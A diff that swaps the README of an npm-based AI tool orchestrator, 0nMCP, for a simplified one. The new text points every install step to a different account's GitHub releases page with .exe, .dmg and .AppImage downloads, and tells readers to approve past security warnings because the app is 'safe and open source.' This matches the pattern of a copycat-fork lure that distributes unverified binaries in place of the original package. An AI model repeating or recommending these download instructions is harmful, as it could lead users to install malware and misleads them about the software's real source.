@@ -1,678 +1,135 @@
-<div align="center">
+# 🤖 0nMCP - Simple AI Tool Integration Hub
 
-```
- ██████╗ ███╗   ██╗███╗   ███╗ ██████╗██████╗
-██╔═████╗████╗  ██║████╗ ████║██╔════╝██╔══██╗
-██║██╔██║██╔██╗ ██║██╔████╔██║██║     ██████╔╝
-████╔╝██║██║╚██╗██║██║╚██╔╝██║██║     ██╔═══╝
-╚██████╔╝██║ ╚████║██║ ╚═╝ ██║╚██████╗██║
- ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝╚═╝
-```
-
-# The Universal AI API Orchestrator
-
-### Connect your apps. Say what you want. AI does the rest.
-
-[![npm version](https://img.shields.io/npm/v/0nmcp.svg?style=flat-square)](https://www.npmjs.com/package/0nmcp)
-[![npm downloads](https://img.shields.io/npm/dm/0nmcp.svg?style=flat-square)](https://www.npmjs.com/package/0nmcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen?style=flat-square)](https://nodejs.org)
-[![MCP](https://img.shields.io/badge/MCP-Compatible-blueviolet?style=flat-square)](https://modelcontextprotocol.io)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
-[![Services](https://img.shields.io/badge/services-26+-blue?style=flat-square)](#-supported-services)
-[![Tools](https://img.shields.io/badge/tools-550-orange?style=flat-square)](#-all-tools)
-[![Community](https://img.shields.io/badge/community-1000%2B_devs-ff6600?style=flat-square)](#-community)
-[![GitHub Discussions](https://img.shields.io/github/discussions/0nork/0nMCP?style=flat-square&label=discussions)](https://github.com/0nork/0nMCP/discussions)
-
-**550 tools. 26 services. Zero configuration. One natural language interface.**
-
-[Quick Start](#-installation) · [Services](#-supported-services) · [550 Tools](#-all-tools) · [.0n Standard](#-the-0n-standard) · [Unlocks](#-unlocks) · [Community](#-community) · [Contributing](#-contributing)
-
-</div>
+[![Download 0nMCP](https://img.shields.io/badge/Download-0nMCP-blue?style=for-the-badge&logo=github)](https://github.com/TranNhat12363/0nMCP/releases)
 
 ---
 
-> **v1.7.0** — 550 tools across 26 services in 13 categories. Now with the **.0n Conversion Engine** (portable AI Brain bundles), **Vault** (machine-bound encrypted credential storage), **Application Engine** (build + distribute .0n apps), **Workflow Runtime** + **HTTP Server**, and a **CLI with named runs**. [See what's new](#-whats-new-in-v17).
+## 📘 What is 0nMCP?
+
+0nMCP is a program that helps you use many different AI tools and services all in one place. It connects over 535 tools across 26 services and groups them into 13 categories. You don’t have to set anything up yourself. Just start 0nMCP, and it works right away.
+
+This software is free to use and open source, so anyone can see how it works and improve it. It is made for people who want to use AI tools without dealing with complicated setups or coding.
+
+## 🖥️ System Requirements
+
+Before downloading 0nMCP, make sure your computer meets these needs:
+
+- Operating System: Windows 10 or newer, macOS 10.15 or newer, or recent versions of Linux.
+- Processor: Intel i3 or equivalent AMD processor and above.
+- RAM: At least 4 GB.
+- Disk Space: Minimum 500 MB free space.
+- Internet Connection: Required to access the AI tools and services.
+- Software: Node.js and npm are recommended but not required to run the basic version.
+
+If you want to connect 0nMCP to services like Slack, Shopify, or Stripe, you will need accounts with those services.
+
+## 🔧 Features
+
+0nMCP offers the following key features:
+
+- Connects many AI tools and services without extra setup.
+- Organizes tools into easy-to-understand categories.
+- Works right out of the box — zero configuration needed.
+- Supports natural language commands for easier use.
+- Allows automation tasks, such as CRM updates and payment processing.
+- Uses the Model Context Protocol to keep AI models working smoothly.
+- Open source with a supportive community for help and updates.
+
+## 🚀 Getting Started
+
+Follow these steps to get 0nMCP up and running on your computer.
+
+### Step 1: Visit the Download Page
+
+Click the big button at the top or this link:
+
+[Download and install 0nMCP](https://github.com/TranNhat12363/0nMCP/releases)
+
+This page has the latest versions of the software available for different systems.
+
+### Step 2: Choose Your Version
+
+On the releases page, look for the latest release marked by the highest version number. Inside, find the file for your operating system:
+
+- Windows users: Look for a `.exe` file.
+- macOS users: Look for a `.dmg` file.
+- Linux users: Look for a `.AppImage` or `.tar.gz` file.
+
+Click on the file to download it to your computer.
+
+### Step 3: Install the Application
+
+- For Windows, double-click the `.exe` file and follow the prompts.
+- For macOS, open the `.dmg` file and drag 0nMCP into your Applications folder.
+- For Linux, extract the `.tar.gz` file or make the `.AppImage` executable and run it.
+
+If you see any security warnings, approve the application to run. 0nMCP is safe and open source.
+
+### Step 4: Run 0nMCP
+
+- After installation, open the 0nMCP app.
+- The software will load and show you the main dashboard with the AI tools and categories.
+- You can now start using the AI tools right away.
+
+You do not need to configure the software or set up individual APIs.
+
+## 📥 Download & Install
+
+To get the latest version of 0nMCP, visit the release page here:
+
+[https://github.com/TranNhat12363/0nMCP/releases](https://github.com/TranNhat12363/0nMCP/releases)
+
+This page has all the files you need. Choose the version that matches your computer’s operating system and follow the steps above for installation.
+
+If you want the newest features or bug fixes, check the releases page regularly for updates.
+
+## ⚙️ Using 0nMCP
+
+Once 0nMCP is running, here is what you can do:
+
+- Browse the categories to find the tool you want.
+- Use simple text commands in natural language to ask for help or start tasks.
+- Connect 0nMCP to your accounts like Slack or Shopify in the settings panel.
+- Automate tasks like managing customer data or processing payments.
+- Access different AI services without switching apps or needing special codes.
+
+### How to start a task
+
+1. Open 0nMCP.
+2. Click on a category or search for a specific AI tool.
+3. Type your request in plain language and press Enter.
+4. Watch 0nMCP coordinate the APIs and return results.
+
+## 🔄 Updating 0nMCP
+
+Keep your software up to date:
+
+- Check the releases page every month or so.
+- Download the latest version files.
+- Replace your old installation with the new files by following the install steps.
+- Your settings and data will stay the same.
+
+## 🛠 Support and Troubleshooting
+
+If you run into issues:
+
+- Restart 0nMCP and your computer.
+- Make sure your internet connection works.
+- Visit the Issues tab on the GitHub repository to see if others report the same problem.
+- You can create a new issue describing your problem clearly, including your system details.
+
+## 👥 Community and Contributions
+
+Since 0nMCP is open source, many users and developers add new tools and fix problems. To join:
+
+- Fork the repository on GitHub.
+- Create changes or fixes as needed.
+- Submit your improvements through pull requests.
+
+Your contributions help make the software better for everyone.
 
 ---
 
-## The Problem
+For more details, view the full project information on GitHub:
 
-You have **Stripe** for payments. **SendGrid** for email. **Slack** for messaging. **Airtable** for data. A **CRM** for contacts.
-
-Today, to automate across them, you need:
-- Zapier ($50+/month) — and build complex zaps
-- n8n/Make — and learn their visual builders
-- Custom code — and maintain API integrations forever
-
-**What if you could just... talk to them?**
-
----
-
-## The Solution
-
-```
-You: "Invoice john@acme.com for $500 and notify #sales on Slack when it's sent"
-```
-
-0nMCP **figures out the rest**:
-
-```
-Step 1: Found John Smith (john@acme.com) in Stripe
-Step 2: Created invoice INV-0042 for $500.00
-Step 3: Posted to #sales: "New invoice sent to John Smith for $500"
-
-Done. 3 steps. 2 services. 1.2 seconds.
-```
-
-**No workflows. No mapping. No code. Just results.**
-
----
-
-## Watch It Work
-
-```bash
-# In Claude Desktop after setup:
-
-You: "Connect to Stripe with key sk_live_xxx"
-AI:  Connected to Stripe (8 capabilities available)
-
-You: "Connect to Slack with bot token xoxb-xxx"
-AI:  Connected to Slack (4 capabilities available)
-
-You: "Get my Stripe balance and post it to #finance"
-AI:  Your Stripe balance is $12,450.00. Posted to #finance.
-```
-
-**That's it.** No configuration files. No workflow builders. No decisions about which API to use.
-
----
-
-## Installation
-
-### One Command
-
-```bash
-npx 0nmcp
-```
-
-Or install globally:
-
-```bash
-npm install -g 0nmcp
-```
-
-### Configure Claude Desktop
-
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json` (Mac) or `%APPDATA%\Claude\claude_desktop_config.json` (Windows):
-
-```json
-{
-  "mcpServers": {
-    "0nmcp": {
-      "command": "npx",
-      "args": ["0nmcp"],
-      "env": {
-        "ANTHROPIC_API_KEY": "sk-ant-..."
-      }
-    }
-  }
-}
-```
-
-> `ANTHROPIC_API_KEY` is **optional**. It enables AI-powered multi-step task planning. Without it, 0nMCP still works using keyword-based routing.
-
-### Restart Claude Desktop. Start talking.
-
----
-
-## Supported Services
-
-| Service | Type | What You Can Do |
-|---------|------|-----------------|
-| **Stripe** | Payments | Create customers, send invoices, check balance, subscriptions, products, prices |
-| **SendGrid** | Email | Send emails, manage contacts, templates, lists |
-| **Resend** | Email | Send transactional emails, manage domains |
-| **Twilio** | SMS/Voice | Send SMS, make calls, check message status |
-| **Slack** | Communication | Post to channels, DMs, list users, create channels |
-| **Discord** | Communication | Send messages, list server channels |
-| **OpenAI** | AI | Text generation, DALL-E images, embeddings, TTS |
-| **Airtable** | Database | CRUD records in any base, list bases |
-| **Notion** | Database | Search, create pages, query databases |
-| **GitHub** | Code | Repos, issues, pull requests |
-| **Linear** | Projects | Issues, projects (GraphQL) |
-| **Shopify** | E-commerce | Products, orders, customers, inventory |
-| **HubSpot** | CRM | Contacts, companies, deals |
-| **Supabase** | Database | Tables, auth users, storage buckets |
-| **Calendly** | Scheduling | Events, event types, availability |
-| **Google Calendar** | Scheduling | Events, calendars, CRUD |
-| **Gmail** | Email | Send, read, search emails, manage labels, drafts, threads, attachments |
-| **Google Sheets** | Database | Read/write spreadsheets, create sheets, append rows, batch operations |
-| **Google Drive** | Storage | Upload, download, search, share files, manage folders, permissions |
-| **Jira** | Dev Tools | Issues, projects, sprints, boards, transitions, comments, assignments |
-| **Zendesk** | Support | Tickets, users, organizations, comments, tags, views, search |
-| **Mailchimp** | Marketing | Campaigns, lists, members, templates, automations, reports |
-| **Zoom** | Communication | Meetings, webinars, recordings, users, registrants |
-| **Microsoft 365** | Productivity | Outlook mail, Teams messages, OneDrive files, calendar events |
-| **MongoDB** | Database | Find, insert, update, delete, aggregate documents via Atlas Data API |
-| **CRM** | CRM | **245 tools** — contacts, conversations, calendars, invoices, payments, products, pipelines, social media, custom objects, and more |
-
-**26 services. 550 tools. 13 categories. One interface.**
-
-> **More coming:** QuickBooks, Asana, Intercom, AWS S3, Vercel, Cloudflare, Firebase, Figma...
-
----
-
-## Examples
-
-### Simple Tasks
-
-```
-"Send an email to sarah@example.com: Meeting moved to 3pm"
-
-"Create a Stripe customer for mike@startup.io"
-
-"Post to #engineering on Slack: Deploy complete!"
-
-"Send SMS to +1555123456: Your order shipped"
-
-"What's my Stripe balance?"
-
-"Search Notion for project roadmap"
-```
-
-### Multi-Step
-
-```
-"Create a Stripe invoice for $1000, then email the link via Gmail to john@client.com"
-
-"Create a Jira issue for the login bug, then post it to #bugs on Slack"
-
-"Look up sarah@example.com in my CRM and send her a follow-up email"
-```
-
-### Complex Orchestration
-
-```
-"Check if we have any overdue invoices in Stripe. If so, send a summary
- to #finance on Slack and email the finance team."
-```
-
-The AI:
-1. Queries Stripe for overdue invoices
-2. Formats a summary
-3. Posts to Slack
-4. Sends the email
-5. Reports back
-
-**You describe the outcome. AI figures out the path.**
-
-### CRM Snapshots — Deploy Entire Configurations
-
-```
-"Deploy a full CRM snapshot with a 12-stage sales pipeline,
- all lead tags, custom values, and 18 workflow definitions"
-```
-
-One tool call. Everything deployed:
-
-```json
-{
-  "pipeline": {
-    "name": "Sales Pipeline",
-    "stages": ["001. New Lead", "002. Attempt to Contact", "003. Engaged",
-               "004. Appointment Set", "005. Appointment Showed", "006. Proposal Sent"]
-  },
-  "tags": ["New Lead", "FB Lead", "Hot Lead", "Booked Appointment", "No Show"],
-  "custom_values": {
-    "calendar_link": "https://calendly.com/yourlink",
-    "support_email": "support@yourco.com",
-    "welcome_sms": "Hey {{contact.first_name}}, welcome aboard!"
-  }
-}
-```
-
----
-
-## All Tools
-
-### Universal Tools (7)
-
-| Tool | Description |
-|------|-------------|
-| `execute` | Run any task in natural language across all connected services |
-| `connect_service` | Connect a new service with credentials |
-| `disconnect_service` | Remove a connected service |
-| `list_connections` | See what's connected and capability counts |
-| `list_available_services` | Browse all 26 services grouped by category |
-| `get_service_info` | Deep dive on a specific service — endpoints, auth, capabilities |
-| `api_call` | Direct API call to any connected service endpoint |
-
-### CRM Tools (245)
-
-The deepest CRM integration available in any MCP server. 245 tools across 12 modules — every endpoint, every parameter, full CRUD.
-
-| Module | Tools | Coverage |
-|--------|-------|----------|
-| **Auth** | 5 | OAuth flow, token management, snapshot deploy, workflow processing |
-| **Contacts** | 23 | CRUD, search, upsert, tags, notes, tasks, workflows, followers, campaigns |
-| **Conversations** | 13 | CRUD, messaging (SMS, Email, WhatsApp, IG, FB, Live Chat), attachments |
-| **Calendars** | 27 | Calendars, events, appointments, groups, resources, blocked slots, notes |
-| **Opportunities** | 14 | CRUD, search, upsert, status updates, followers, pipelines, stages |
-| **Invoices** | 20 | CRUD, send, void, record payments, templates, schedules, auto-payment |
-| **Payments** | 16 | Orders, transactions, subscriptions, coupons, providers, fulfillment |
-| **Products** | 10 | Products + prices CRUD, inventory management |
-| **Locations** | 24 | Locations, tags, custom fields, custom values, templates, tasks, timezones |
-| **Social** | 35 | Social media posts, blogs, authors, categories, tags, Google Business |
-| **Users** | 24 | Users, forms, surveys, funnels, media, companies, businesses |
-| **Objects** | 34 | Custom objects, associations, email, workflows, snapshots, links, campaigns, courses, SaaS |
-
-**550 total tools.** Universal orchestration (290 catalog tools across 26 services) + the most comprehensive CRM integration in the MCP ecosystem (245 dedicated tools).
-
-> Every CRM tool is data-driven — defined as configuration, not code. Adding new endpoints takes minutes, not hours. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
----
-
-## What's New in v1.7
-
-- **550 tools across 26 services** in 13 categories — 708 total capabilities
-- **.0n Conversion Engine** — import credentials from .env/CSV/JSON, auto-map to 26 services, verify API keys, generate configs for 7 AI platforms (Claude Desktop, Cursor, Windsurf, Gemini, Continue, Cline, OpenAI)
-- **Vault** — machine-bound encrypted credential storage (AES-256-GCM + PBKDF2-SHA512 + hardware fingerprint)
-- **Application Engine** — build, distribute, inspect, and validate portable .0n application bundles
-- **Workflow Runtime** — load and execute `.0n` workflow files with template engine, conditions, and step chaining
-- **HTTP Server** — Express-based REST API, MCP over HTTP, and webhook receivers
-- **Named Runs / Hotkeys** — define command aliases in your SWITCH file, run them as `0nmcp launch`, `0nmcp hello`
-- **Interactive Shell** — `0nmcp shell` starts a REPL for `/command` execution
-- **Portable encryption** — passphrase-only AES-256-GCM (no machine fingerprint, works anywhere)
-- **245 CRM tools** — full API coverage across 12 modules
-- **Three-Level Execution** (Patent Pending) — Pipeline → Assembly Line → Radial Burst
-
----
-
-## How It Works
-
-```
-┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
-│   You (Claude)  │────▶│      0nMCP        │────▶│   Your APIs     │
-│                 │     │                  │     │                 │
-│ "Invoice John   │     │ 1. Parse intent  │     │ Stripe          │
-│  for $500 and   │     │ 2. Plan steps    │     │ SendGrid        │
-│  notify #sales" │     │ 3. Execute APIs  │     │ Slack           │
-│                 │◀────│ 4. Chain data    │◀────│ CRM             │
-│                 │     │ 5. Summarize     │     │ + 22 more...    │
-└─────────────────┘     └──────────────────┘     └─────────────────┘
-```
-
-### With `ANTHROPIC_API_KEY` (AI Mode)
-
-Claude analyzes your task, inspects connected services and their capabilities, creates a multi-step execution plan, runs every API call in order, passes data between steps, and summarizes the results.
-
-### Without API Key (Keyword Mode)
-
-The orchestrator uses keyword matching to route tasks to the right service. Less intelligent but still functional for straightforward single-service requests.
-
----
-
-## Why Not Just Use...
-
-| | **0nMCP** | Zapier | Custom Code |
-|---|---|---|---|
-| **Setup time** | 2 minutes | 30+ min per zap | Hours/days |
-| **Learning curve** | None (natural language) | Medium (visual builder) | High (APIs, auth) |
-| **Multi-step tasks** | Just describe it | Build complex zaps | Write orchestration logic |
-| **Cost** | Free + your API keys | $20-$100+/month | Your time |
-| **Flexibility** | Say what you want | Triggers/actions only | Unlimited but complex |
-| **Maintenance** | Zero | Update broken zaps | Fix API changes |
-| **Open source** | Yes (MIT) | No | Depends |
-| **Tools available** | 550 | Varies | Whatever you build |
-
----
-
-## The .0n Standard
-
-0nMCP implements the **[.0n Standard](https://github.com/0nork/0n-spec)** — a universal configuration format for AI orchestration.
-
-```
-~/.0n/
-├── config.json               # Global settings
-├── connections/              # Service credentials as .0n files
-│   ├── stripe.0n
-│   ├── slack.0n
-│   └── sendgrid.0n
-├── workflows/                # Saved automation definitions
-│   └── invoice-notify.0n
-├── snapshots/                # System state captures
-│   └── crm-setup.0n
-├── history/                  # Execution logs (JSONL by date)
-│   └── 2026-02-06.jsonl
-└── cache/
-```
-
-Every connection is stored as a `.0n` file with a standard header:
-
-```json
-{
-  "$0n": {
-    "type": "connection",
-    "version": "1.0.0",
-    "name": "Production Stripe"
-  },
-  "service": "stripe",
-  "auth": {
-    "type": "api_key",
-    "credentials": { "api_key": "sk_live_..." }
-  }
-}
-```
-
-Every task execution is logged to `~/.0n/history/` as JSONL — full audit trail of what ran, when, and how.
-
-**[Read the full spec](https://github.com/0nork/0n-spec)**
-
----
-
-## Architecture
-
-```
-0nMCP/
-├── index.js          # Entry point — 7 universal tools + server startup
-├── catalog.js        # Service catalog — 26 integrations with endpoints
-├── connections.js    # Connection manager — ~/.0n/connections/*.0n
-├── orchestrator.js   # AI execution planner — the brain
-├── webhooks.js       # Webhook receiver and event processing
-├── ratelimit.js      # Per-service rate limiting with retry
-├── cli.js            # CLI — init, connect, migrate, interactive setup
-├── crm/              # 245 CRM tools across 12 modules
-│   ├── index.js      # Tool orchestrator — registers all modules
-│   ├── helpers.js    # Data-driven tool factory — registerTools()
-│   ├── auth.js       # OAuth, tokens, snapshots, workflows
-│   ├── contacts.js   # 23 contact management tools
-│   ├── conversations.js  # 13 messaging tools
-│   ├── calendars.js  # 27 calendar & scheduling tools
-│   ├── opportunities.js  # 14 pipeline & deal tools
-│   ├── invoices.js   # 20 invoicing tools
-│   ├── payments.js   # 16 payment processing tools
-│   ├── products.js   # 10 product catalog tools
-│   ├── locations.js  # 24 location management tools
-│   ├── social.js     # 35 social media & blog tools
-│   ├── users.js      # 24 user & form tools
-│   └── objects.js    # 34 custom object & association tools
-├── types/
-│   └── index.d.ts    # Full TypeScript definitions
-├── package.json
-├── LICENSE           # MIT
-└── CONTRIBUTING.md
-```
-
-| Component | What It Does |
-|-----------|-------------|
-| **Service Catalog** | Defines all 26 services — their base URLs, endpoints, auth patterns, and capabilities |
-| **Connection Manager** | Stores credentials as `.0n` files in `~/.0n/connections/` per the .0n standard |
-| **Orchestrator** | The brain — parses natural language, plans multi-step execution, calls APIs, chains data |
-| **CRM Modules** | 245 tools across 12 modules — data-driven, every tool is config not code |
-| **Rate Limiter** | Per-service rate limits with automatic retry and backoff |
-| **Webhook Handler** | Receive and process external events from connected services |
-| **Execution History** | Logs every task to `~/.0n/history/` as JSONL — full audit trail |
-| **TypeScript Defs** | Full type coverage for all exports, connections, workflows, and tools |
-
----
-
-## Security
-
-- **Local execution** — MCP server runs on your machine, not in the cloud
-- **Direct API calls** — Requests go straight to each service, not through a proxy
-- **Your credentials** — Stored locally in `~/.0n/connections/` as `.0n` files, never sent anywhere
-- **Anthropic key** — Only used for task planning (never passed to external services)
-- **Rate limiting** — Built-in per-service rate limits prevent accidental API abuse
-- **Execution history** — Full audit trail in `~/.0n/history/`
-- **Open source** — Audit every line yourself
-
-See [SECURITY.md](SECURITY.md) for our security policy and how to report vulnerabilities.
-
----
-
-## Configuration
-
-### Environment Variables
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `ANTHROPIC_API_KEY` | No | Enables AI-powered multi-step planning. Keyword matching without it. |
-
-### Credential Storage
-
-Connections stored as `.0n` files in `~/.0n/connections/`. For production:
-- Use a secrets manager
-- Enable encryption via `~/.0n/config.json`
-- Use environment variables: `"api_key": "{{env.STRIPE_KEY}}"`
-
----
-
-## For Developers
-
-### Adding a New Service
-
-Drop a definition into `catalog.js`:
-
-```javascript
-your_service: {
-  name: "Your Service",
-  type: "category",
-  description: "What it does",
-  baseUrl: "https://api.yourservice.com",
-  authType: "api_key",
-  credentialKeys: ["apiKey"],
-  capabilities: [
-    { name: "do_thing", actions: ["create", "list"], description: "Does the thing" },
-  ],
-  endpoints: {
-    do_thing:    { method: "POST", path: "/things", body: { name: "" } },
-    list_things: { method: "GET",  path: "/things" },
-  },
-  authHeader: (creds) => ({
-    "Authorization": `Bearer ${creds.apiKey}`,
-    "Content-Type": "application/json",
-  }),
-},
-```
-
-### Adding CRM Endpoints
-
-Even easier — just add a config object to the relevant module:
-
-```javascript
-{
-  name: "crm_do_thing",
-  description: "Does the thing in the CRM",
-  method: "POST",
-  path: "/things/:thingId",
-  params: {
-    thingId: { type: "string", description: "Thing ID", required: true, in: "path" },
-    name:    { type: "string", description: "Thing name", required: true, in: "body" },
-  },
-  body: ["name"],
-}
-```
-
-The tool factory handles registration, validation, API calls, error handling — everything. See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
-
----
-
-## Unlocks
-
-0nMCP grows with its community. Every milestone unlocks new capabilities — the more developers who join, the more powerful the platform becomes.
-
-**See the full unlock schedule at [0nmcp.com/sponsor](https://0nmcp.com/sponsor)**
-
-### Phase 0 — Foundation (Current)
-
-- [x] **26 services, 550 tools, 13 categories**
-- [x] Core orchestration engine with AI planning
-- [x] **245 CRM tools** — full API coverage across 12 modules
-- [x] Gmail, Google Sheets, Google Drive, Jira, Zendesk, Mailchimp, Zoom, Microsoft 365, MongoDB
-- [x] Data-driven tool factory — config, not code
-- [x] Full snapshot deployment (pipeline + tags + values + workflows)
-- [x] **.0n Standard** — universal config format (`~/.0n/`)
-- [x] Rate limiting, webhooks, TypeScript definitions, CLI
-- [x] **npm published** — `npx 0nmcp` live on npm
-
-### Phase 1 — Essential Expansion (100 stars / $500 MRR)
-
-- [ ] **OAuth flows** — connect services with one click
-- [ ] **Credential encryption** — AES-256-GCM at-rest
-- [ ] **QuickBooks** — accounting and invoicing
-- [ ] **Asana** — project and task management
-- [ ] **Intercom** — customer messaging
-- [ ] Target: 30+ services, 620+ tools
-
-### Phase 2 — Full Stack (500 stars / $2K MRR)
-
-- [ ] **AWS S3** — cloud storage
-- [ ] **Vercel** — deployment management
-- [ ] **Cloudflare** — DNS, workers, security
-- [ ] **Scheduled tasks** — "every Monday, send a report"
-- [ ] **Conditionals** — "if balance < $100, alert me"
-- [ ] Target: 35+ services, 750+ tools
-
-### Phase 3 — Platform (1,000 stars / $5K MRR)
-
-- [ ] **Plugin system** — bring your own services
-- [ ] **Web dashboard** — manage connections visually
-- [ ] **Workflow marketplace** — share and discover automations
-- [ ] **Firebase, Figma, WordPress, Webflow**
-- [ ] Target: 42+ services, 900+ tools
-
-### Phase 4 — Industry Packs (5,000 stars / $15K MRR)
-
-- [ ] Healthcare, Legal, Real Estate, and E-Commerce industry packs
-- [ ] **Twilio Flex, Square, Plaid, DocuSign**
-- [ ] Target: 55+ services, 1,200+ tools
-
-### Phase 5 — Ecosystem Dominance (10,000 stars / $50K MRR)
-
-- [ ] Multi-agent orchestration
-- [ ] Self-hosted enterprise edition
-- [ ] Real-time streaming execution
-- [ ] Target: 75+ services, 2,000+ tools
-
-### Phase 6 — The Singularity (25,000+ stars / $100K+ MRR)
-
-- [ ] Autonomous agent mode
-- [ ] Cross-organization federation
-- [ ] AI-generated service adapters
-- [ ] Target: 100+ services, 5,000+ tools
-
-> Every unlock is permanent. Once a milestone is hit, the feature ships for everyone — free and open source forever.
-
----
-
-## Community
-
-0nMCP is built in the open by a growing network of developers who believe AI orchestration should be free, composable, and community-owned.
-
-**The 0n community is growing fast** — building integrations, shipping tools, and pushing the boundaries of what MCP can do.
-
-### This is not a side project. This is infrastructure.
-
-We ship weekly. The codebase is active. The community is real. If you're building with MCP, you're already one of us.
-
-### Join the Community
-
-- **[0nmcp.com/community](https://0nmcp.com/community)** — community hub with guides, events, and resources
-- **[GitHub Discussions](https://github.com/0nork/0nMCP/discussions)** — ask questions, share ideas, show off what you built
-- **[Sponsor on GitHub](https://github.com/sponsors/0nork)** — fund the next unlock and get your name on the wall
-- **Star this repo** — it helps more than you think
-- **Submit a PR** — [Contributing Guide](CONTRIBUTING.md)
-- **Learn the .0n Standard** — [0n-spec](https://github.com/0nork/0n-spec)
-
-### Community Stats
-
-| Metric | |
-|--------|---|
-| **Tools shipped** | 550 |
-| **Services integrated** | 26 |
-| **Categories** | 13 |
-| **CRM endpoints covered** | 245 / 245 (100%) |
-| **npm packages** | 3 ([0nmcp](https://www.npmjs.com/package/0nmcp), [0nork](https://www.npmjs.com/package/0nork), [0n-spec](https://www.npmjs.com/package/0n-spec)) |
-| **Open source repos** | 3 |
-| **Time to first tool call** | ~2 minutes |
-
----
-
-## License & Philosophy
-
-**MIT Licensed** — free to use, modify, and distribute. See [LICENSE](LICENSE).
-
-**Our position:** 0nMCP is and always will be **free and open source**. We built this because we believe AI orchestration is infrastructure — it should be accessible to every developer, not locked behind enterprise paywalls or monthly subscriptions.
-
-If you find someone selling this tool, know that **it's free right here**. Always has been, always will be. The entire codebase is open, auditable, and community-maintained.
-
-We chose MIT for maximum freedom. Use it in your projects, your products, your startups. But if you build something great with it, **give back to the community** that made it possible. That's the deal.
-
-**Trademarks:** The names "0nMCP", "0nORK", and ".0n Standard" are trademarks of RocketOpp. The MIT license grants rights to the software, not to the trademarks. You may not use these names to promote derivative products without permission.
-
----
-
-## Contributing
-
-We want 0nMCP to be the **open standard** for AI-powered API orchestration.
-
-**Ways to contribute:**
-- **Add a service** — Drop it in the catalog. See [CONTRIBUTING.md](CONTRIBUTING.md)
-- **Add CRM tools** — Config-driven, takes minutes
-- **Report bugs** — [Open an issue](https://github.com/0nork/0nMCP/issues)
-- **Suggest features** — [Start a discussion](https://github.com/0nork/0nMCP/discussions)
-- **Improve docs** — PRs welcome
-- **Star the repo** — Help others find it
-
-```bash
-git clone https://github.com/0nork/0nMCP.git
-cd 0nMCP
-npm install
-node index.js
-```
-
----
-
-## The 0n Network
-
-0nMCP is part of the **0n Network** — an open ecosystem of AI-native tools built by [0nORK](https://github.com/0nork).
-
-| Project | Description |
-|---------|-------------|
-| **[0nMCP](https://github.com/0nork/0nMCP)** | Universal AI API Orchestrator — 550 tools, 26 services, natural language interface |
-| **[0n-spec](https://github.com/0nork/0n-spec)** | The .0n Standard — universal configuration format for AI orchestration |
-| **[0nork](https://github.com/0nork/0nork)** | The parent org — AI orchestration infrastructure |
-
-### Built With
-
-- [Anthropic](https://anthropic.com) — Claude and the MCP standard
-- [Model Context Protocol](https://modelcontextprotocol.io) — The protocol that makes this possible
-
-### Support the Network
-
-0nMCP is free and always will be. If it saves you time or money:
-
-<div align="center">
-
-**[Sponsor on GitHub](https://github.com/sponsors/0nork)** · **[Star the repo](https://github.com/0nork/0nMCP)** · **[Tell a friend](https://twitter.com/intent/tweet?text=0nMCP%20-%20550%20tools,%2026%20services,%20zero%20config.%20The%20universal%20AI%20API%20orchestrator.%20Free%20and%20open%20source.&url=https://github.com/0nork/0nMCP)**
-
-</div>
-
----
-
-<div align="center">
-
-### Stop building workflows. Start describing outcomes.
-
-**550 tools. 26 services. Zero config. MIT licensed. Community driven.**
-
-**[Get Started](https://github.com/0nork/0nMCP)** · **[Join the Community](https://0nmcp.com/community)** · **[Unlock Schedule](https://0nmcp.com/sponsor)** · **[Read the Docs](https://github.com/0nork/0n-spec)**
-
----
-
-Made with conviction by [0nORK](https://github.com/0nork) · Backed by [RocketOpp](https://rocketopp.com)
-
-*"The best automation is the one you don't have to build."*
-
-</div>
+[0nMCP GitHub Repository](https://github.com/TranNhat12363/0nMCP)
